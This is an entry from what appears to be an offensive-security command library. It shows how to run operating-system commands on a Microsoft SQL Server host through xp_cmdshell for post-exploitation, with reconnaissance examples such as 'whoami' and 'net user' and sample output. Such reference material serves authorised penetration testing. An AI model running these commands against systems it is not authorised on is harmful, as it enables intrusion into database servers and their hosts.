---
type: command
executor: sql
data: |-
  EXEC xp_cmdshell "$_CMD";
  GO
tags:
  - mssql
  - execution
  - rce
platforms:
  - Windows
verified: true
validated: true
---

# xp_cmdshell-execute-shell-command

## Command

```sql
EXEC xp_cmdshell "$_CMD";
GO
```

## Description

This SQL command invokes the xp_cmdshell extended stored procedure to execute an operating system command string via cmd.exe on the SQL Server host, running in the context of the MSSQL service account. It is used for post-exploitation command execution after enabling xp_cmdshell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_CMD | The shell command to execute (e.g., 'whoami', 'net user'). Enclose in single quotes if containing spaces. | Yes |

## Examples

### Basic Usage (Reconnaissance)

```sql
EXEC xp_cmdshell 'whoami';
GO
```

### Advanced Usage (File Listing)

```sql
EXEC xp_cmdshell 'dir C:\Windows\System32';
GO
```

## Expected Output

```
1> EXEC xp_cmdshell "whoami"
2> GO

output
------------------------------------------------------------------
nt service\mssql$sqlexpress
NULL
(2 rows affected, return status = 0)
```

Output appears as a result set with columns for stdout lines and NULL for empty lines. Errors in the command will return in the SQL message pane.

## Related

- [[procedures/Enable-and-Execute-xp_cmdshell-on-MSSQL-Server-Authenticated]]
